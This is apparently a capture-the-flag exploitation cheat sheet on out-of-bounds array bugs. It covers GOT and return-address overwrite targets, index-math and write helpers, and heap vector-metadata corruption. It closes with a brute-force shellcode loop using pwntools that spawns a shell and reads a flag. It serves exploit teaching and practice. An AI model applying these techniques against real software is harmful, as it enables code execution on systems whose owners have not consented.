# OOB Array

**When:** An array index operation (`arr[idx] = value)` or `arr[idx]`) has no bounds check, letting you read/write outside the array's memory. This gives an **arbitrary write/read primitive** if you can calculate the right index.

## Bug Shapes

```c
arr[idx] = value;              // no bounds check at all
arr[(unsigned)idx] = value;    // signed/unsigned confusion (negative idx wraps)
vec[idx] = value;              // vector operator[] unchecked
buf[i + base] = value;         // arithmetic bug lets i+base go negative/too large
```

## Targets

Pick your target based on protections:

| Protection               | Target                  | Strategy                        |
| ------------------------ | ----------------------- | ------------------------------- |
| No PIE, Partial RELRO    | GOT entry               | Overwrite GOT with `system`     |
| No PIE, Full RELRO       | Return address on stack | Overwrite saved RIP             |
| PIE + leak               | GOT or return address   | Use leak to compute target addr |
| Stack array, no canary   | Return address          | Negative index to saved RIP     |
| Heap array               | Adjacent chunk metadata | Corrupt tcache fd               |
| Struct with function ptr | The function ptr        | Overwrite with win/system       |

## Index Math

Given the array base address and the target address, compute the index:

```python
# For a long long array (8-byte elements)
idx = (target - array_base) // 8

# For a char/byte array
idx = target - array_base

# Negative index (before the array, e.g., to reach return address)
idx = -((array_base - target) // 8)

# Using the formula directly:
# arr[target_addr - arr_addr] = value
```

### Write helpers

```python
def write_qword(target, value):
    idx = (target - array_base) // 8
    edit(idx, value)

def write_byte(target, value):
    idx = target - array_base
    edit(idx, value)
```

## Heap OOB: Vector Metadata

C++ `std::vector` stores: `[start_ptr, end_ptr, capacity_ptr]`. An OOB on the vector data can overwrite the vector's own metadata if the vector is allocated adjacent to other data.

```python
# Overwrite vector's internal pointer to redirect next allocation
fake_chunk = elf.sym["target"] - 8   # -8 for malloc header
edit(num_slots_idx, 1)               # shrink size
edit(entries_idx, fake_chunk)        # redirect entries pointer
add(0x67)  # allocates on target address
```

## Known Address (No PIE)

When both the array and the target (e.g., GOT) are at known addresses, calculate the index directly:

```python
# Heap array, GOT at 0x404010
dis = -((heap_leak - 0x18a0 - 0x404010) // 8)
w(dis, win_addr)  # overwrite __gmon_start__ GOT with win()
```

## GDB Checks

```gdb
p/x &arr         # array base address
p/x &target      # target address (GOT entry, RSP, etc.)
x/20gx &arr      # view array contents
watch *(long long*)target  # break when target changes
```

## Heap OOB To Huge RWX `mmap`

Pattern:

```c
shellcode = mmap(NULL, 0x1000000, PROT_READ|PROT_WRITE|PROT_EXEC,
                 MAP_ANON|MAP_PRIVATE, -1, 0);
memset(shellcode, 0x90, 0x1000000);

struct dynarr {
    unsigned int len;
    unsigned int cap;
    unsigned long long data[];
};

vec = calloc(sizeof(struct dynarr) + 0x10 * 8, 1);
vec->data[idx] = value;   // no bounds check
((void(*)())shellcode)();
```

Exploit idea:

```text
1. Use the unchecked index as a qword write relative to vec->data.
2. Target the huge RWX mmap region, which is already a NOP sled.
3. Write shellcode qwords somewhere inside the mapped region.
4. Trigger call to shellcode base; execution slides through NOPs into shellcode.
```

Index math:

```python
idx = (shellcode_addr + offset - vec_data_addr) // 8
```

If there is no leak, the exact distance can be ASLR-dependent. Brute-force by attempts:

```python
sc = asm(shellcraft.sh())

def write_qwords(base_idx):
    for off in range(0, len(sc), 8):
        chunk = sc[off:off+8].ljust(8, b"\x90")
        edit(base_idx + off // 8, u64(chunk))

for base_idx in candidate_indices:
    io = start()
    add(0)                 # make sure vec exists
    write_qwords(base_idx)
    call_shellcode()
    io.sendline(b"id; cat flag*")
```

Red flags in wrong solves:

```text
Hardcoded heap/mmap offsets without a leak are usually not portable.
Writing only one qword is not enough unless it is a complete useful stub.
Check loop ranges; range(high, low) with default positive step is empty.
```
